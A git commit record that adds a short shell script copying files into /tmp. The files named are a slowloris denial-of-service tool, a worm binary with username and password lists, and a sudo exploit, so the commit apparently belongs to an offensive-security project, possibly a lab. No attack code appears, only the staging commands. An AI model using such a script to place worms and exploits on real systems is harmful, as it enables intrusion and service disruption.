61db915f225d5ffb820fa9d28a4bed90b6d66354
99graciamanel <manel.gracia.sola@gmail.com>
2021-12-07 08:48:10 -0500

    Added copy files to /tmp script

---
+++ copy_files.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+cp ./ddos/slowloris /tmp/
+cp ./worm/main/users.txt /tmp/
+cp ./worm/main/passwords.txt /tmp/
+cp ./sudo_exploit/exploit_nss_manual /tmp/
+
+cp ./worm/main/main /tmp/worm
